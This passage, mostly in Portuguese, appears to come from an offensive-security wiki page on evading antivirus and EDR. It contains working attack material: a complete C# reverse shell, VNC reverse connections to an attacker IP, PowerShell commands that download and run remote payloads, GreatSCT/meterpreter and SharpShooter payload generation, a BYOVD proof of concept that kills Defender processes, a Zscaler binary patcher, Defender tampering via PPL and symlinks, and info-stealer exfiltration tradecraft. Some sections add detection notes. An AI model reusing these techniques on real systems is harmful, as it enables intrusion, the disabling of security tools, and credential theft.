- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é simples apenas implantar o Chrome Remote Desktop em um PC vítima e então usá-lo para tomar controle e manter persistência:
1. Download from https://remotedesktop.google.com/, clique em "Set up via SSH", e então clique no arquivo MSI para Windows para baixar o MSI.
2. Execute o instalador silenciosamente na vítima (admin requerido): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em next. O assistente pedirá para autorizar; clique no botão Authorize para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin que permite definir o pin sem usar a GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes você tem que levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível ficar completamente indetectável em ambientes maduros.

Cada ambiente que você enfrenta terá suas próprias forças e fraquezas.

Recomendo fortemente que assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma base sobre técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até **descobrir qual parte o Defender** está identificando como maliciosa e informar você.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com um serviço web aberto em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você podia instalar (como administrador) executando:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar telnet port** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não o instalador)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter a stealth você não deve fazer as seguintes coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará com que [a janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro reverse shell em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do Kernel

Storm-2603 aproveitou uma pequena ferramenta de console conhecida como **Antivirus Terminator** para desabilitar proteções de endpoint antes de desplegar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até serviços AV em Protected-Process-Light (PPL) não conseguem bloquear.

Principais pontos
1. **Driver assinado**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Porque o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço de kernel** e a segunda o inicia para que `\\.\ServiceMouse` fique acessível a partir do espaço do usuário.
3. **IOCTLs expostos pelo driver**
| IOCTL code | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Deletar um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: BYOVD contorna totalmente as proteções em modo usuário; código que executa no kernel pode abrir processos *protegidos*, terminá‑los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras medidas de endurecimento.

Detecção / Mitigação
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.  
•  Monitorar criações de novos serviços de *kernel* e alertar quando um driver é carregado de um diretório gravável por todos ou não está presente na allow-list.  
•  Observar handles em modo usuário para objetos de dispositivo customizados seguidos de chamadas `DeviceIoControl` suspeitas.

### Bypass das verificações de Posture do Zscaler Client Connector via Patch de Binários em Disco

O **Client Connector** da Zscaler aplica regras de posture do dispositivo localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass total possível:

1. A avaliação de posture acontece **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos apenas validam que o executável conectante está **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1` para que toda verificação seja considerada compatível |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode ligar‑se aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Contornado |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Depois de substituir os arquivos originais e reiniciar a service stack:

* **Todos** os posture checks exibem **green/compliant**.
* Binaries sem assinatura ou modificados podem abrir os named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusando do Protected Process Light (PPL) para manipular AV/EDR com LOLBINs

Protected Process Light (PPL) aplica uma hierarquia signer/level de modo que apenas processos protegidos de mesmo ou maior nível podem manipular uns aos outros. No ofensivo, se você conseguir iniciar legitimamente um binário compatível com PPL e controlar seus argumentos, pode converter funcionalidades benignas (e.g., logging) em uma primitive de escrita restrita, apoiada por PPL, contra diretórios protegidos usados por AV/EDR.

O que faz um processo rodar como PPL
- O EXE alvo (e quaisquer DLLs carregadas) deve estar assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Um protection level compatível deve ser solicitado que corresponda ao signer do binário (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers anti-malware, `PROTECTION_LEVEL_WINDOWS` para signers Windows). Níveis incorretos falharão na criação.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Auxiliar open-source: CreateProcessAsPPL (seleciona o protection level e encaminha os argumentos para o EXE alvo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` auto-inicia e aceita um parâmetro para escrever um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com suporte PPL.
- O ClipUp não consegue analisar caminhos que contêm espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

Ajuda para caminhos curtos 8.3
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Derivar caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de log-path do ClipUp para forçar a criação de arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto está em execução (por exemplo, MsMpEng.exe), agende a escrita no boot antes do AV iniciar instalando um serviço de auto-start que seja executado mais cedo de forma confiável. Valide a ordem de boot com Process Monitor (boot logging).
4) No reboot, a escrita com suporte PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Exemplo de invocação (caminhos ocultados/encurtados por segurança):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que ClipUp grava além da localização; a primitiva é mais adequada para corrupção do que para injeção precisa de conteúdo.
- Requer Administrador local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- A sincronização é crítica: o alvo não pode estar aberto; a execução na inicialização evita bloqueios de arquivos.

Detecções
- Criação de processo de `ClipUp.exe` com argumentos incomuns, especialmente com processo pai não padrão, durante a inicialização.
- Novos serviços configurados para auto-iniciar binários suspeitos e que consistentemente iniciam antes do Defender/AV. Investigue criação/modificação de serviços antes de falhas na inicialização do Defender.
- Monitoramento de integridade de arquivos nos binários do Defender/diretórios Platform; criações/modificações inesperadas por processos com flags protected-process.
- Telemetria ETW/EDR: procure por processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de nível PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem rodar como PPL e sob quais processos pais; bloqueie invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja criação/modificação de serviços auto-iniciáveis e monitore manipulação da ordem de inicialização.
- Certifique-se de que a proteção contra adulteração do Defender e as proteções de early-launch estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se compatível com seu ambiente (teste exaustivamente).

Referências para PPL e ferramentas
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Adulterando Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender escolhe a plataforma de onde é executado enumerando subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (por exemplo, `4.18.25070.5-0`), e então inicia os processos de serviço do Defender a partir daí (atualizando caminhos de serviço/registro conforme necessário). Essa seleção confia em entradas de diretório, incluindo directory reparse points (symlinks). Um administrador pode aproveitar isso para redirecionar o Defender para um caminho gravável por um atacante e obter DLL sideloading ou interromper o serviço.

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks na pasta Platform)
- Capacidade de reiniciar ou acionar a re-seleção da Platform do Defender (reinício/serviço na inicialização)
- Apenas ferramentas integradas são necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção da pasta Platform confia em entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar que o destino resolva para um caminho protegido/confiável.

Passo-a-passo (exemplo)
1) Prepare um clone gravável da pasta Platform atual, ex.: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório com versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração/registro do serviço refletindo essa localização.

Post-exploitation options
- DLL sideloading/code execution: Coloque/substitua DLLs que o Defender carrega do diretório da aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, no próximo início, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalonamento de privilégios por si só; ela requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a runtime evasion para fora do C2 implant e para dentro do próprio módulo alvo ao hookar sua Import Address Table (IAT) e encaminhar APIs selecionadas através de código position‑independent controlado pelo atacante (PIC). Isso generaliza a evasão além da pequena superfície de API que muitos kits expõem (por exemplo, CreateProcessA), e estende as mesmas proteções para BOFs e post‑exploitation DLLs.

Abordagem de alto nível
- Deploy um blob PIC ao lado do módulo alvo usando um reflective loader (prepended ou companion). O PIC deve ser autocontido e position‑independent.
- Enquanto a DLL host carrega, percorra seu IMAGE_IMPORT_DESCRIPTOR e modifique as entradas da IAT para os imports alvo (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontar para thin PIC wrappers.
- Cada PIC wrapper executa evasões antes de tail‑calling o endereço real da API. Evasões típicas incluem:
  - Mascarar/desmascarar memória ao redor da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e depois restaurar após a chamada.
  - Call‑stack spoofing: construir uma pilha benign e transitar para a API alvo para que a análise da call‑stack resolva para os frames esperados.
- Para compatibilidade, exporte uma interface para que um Aggressor script (ou equivalente) possa registrar quais APIs hookar para Beacon, BOFs e post‑ex DLLs.

Por que IAT hooking aqui
- Funciona para qualquer código que use o import hooked, sem modificar o código da ferramenta ou depender do Beacon para fazer proxy de APIs específicas.
- Cobre post‑ex DLLs: hooking LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar a mesma mascaramento/evasão de pilha às suas chamadas de API.
- Restaura o uso confiável de comandos post‑ex que geram processos contra detecções baseadas em call‑stack ao envolver CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso da importação. Reflective loaders like TitanLdr/AceLdr demonstram hooking durante DllMain do módulo carregado.
- Mantenha wrappers tiny e PIC-safe; resolva a API real via o valor original da IAT que você capturou antes do patch ou via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC e evite deixar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs constroem uma cadeia de chamadas falsa (endereços de retorno para módulos benignos) e então pivotam para a API real.
- Isso derrota detecções que esperam pilhas canônicas de Beacon/BOFs para APIs sensíveis.
- Emparelhe com stack cutting/stack stitching techniques para aterrissar dentro dos frames esperados antes do prólogo da API.

Integração operacional
- Prepend o reflective loader aos post‑ex DLLs para que o PIC e os hooks inicializem automaticamente quando o DLL for carregado.
- Use um script Aggressor para registrar as APIs alvo de forma que Beacon e BOFs se beneficiem transparentemente do mesmo caminho de evasão sem alterações no código.

Considerações de Detecção/DFIR
- IAT integrity: entradas que resolvem para endereços non‑image (heap/anon); verificação periódica dos ponteiros de importação.
- Stack anomalies: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC non‑image; ascendência inconsistente de RtlUserThreadStart.
- Loader telemetry: escritas in‑process na IAT, atividade precoce em DllMain que modifica import thunks, regiões RX inesperadas criadas no load.
- Image‑load evasion: se hookando LoadLibrary*, monitore carregamentos suspeitos de automation/clr assemblies correlacionados com eventos de memory masking.

Blocos de construção e exemplos relacionados
- Reflective loaders que realizam IAT patching durante o carregamento (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra como info-stealers modernos combinam AV bypass, anti-analysis e acesso a credenciais em um único workflow.

### Bloqueio por layout de teclado & atraso em sandbox

- Uma flag de config (`anti_cis`) enumera layouts de teclado instalados via `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a amostra derruba um marcador vazio `CIS` e termina antes de executar os stealers, garantindo que nunca detone em localidades excluídas enquanto deixa um artefato de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas `check_antivm`

- Variante A percorre a lista de processos, aplica hash em cada nome com um checksum rolling customizado e compara contra blocklists embutidas para debuggers/sandboxes; repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- Variante B inspeciona propriedades do sistema (limiar de contagem de processos, uptime recente), chama OpenServiceA("VBoxGuest") para detectar VirtualBox Guest Additions, e realiza checagens de temporização em torno de sleeps para identificar single-stepping. Qualquer detecção aborta antes do lançamento dos módulos.

### Fileless helper + double ChaCha20 reflective loading

- O DLL/EXE primário embute um Chromium credential helper que é ou dropado em disco ou mapeado manualmente em memória; o modo fileless resolve imports/relocations por conta própria para que nenhum artefato do helper seja escrito.
- Esse helper armazena um DLL de segunda etapa criptografado duas vezes com ChaCha20 (dois keys de 32 bytes + nonces de 12 bytes). Após as duas passagens, ele carrega reflexivamente o blob (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- As rotinas do ChromElevator usam direct-syscall reflective process hollowing para injetar em um navegador Chromium ativo, herdar AppBound Encryption keys, e descriptografar senhas/cookies/cartões de crédito diretamente de bancos SQLite apesar do hardening ABE.

### Coleta modular em memória & exfil HTTP em chunks

- `create_memory_based_log` itera uma tabela global de ponteiros de função `memory_generators` e gera uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, browser extensions, etc.). Cada thread grava resultados em buffers compartilhados e reporta sua contagem de arquivos após uma janela de join de ~45s.
- Uma vez finalizado, tudo é zipado com a biblioteca staticamente linkada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, forjando um boundary de browser `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, e o último chunk anexa `complete: true` para que o C2 saiba que a reassemblagem está concluída.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
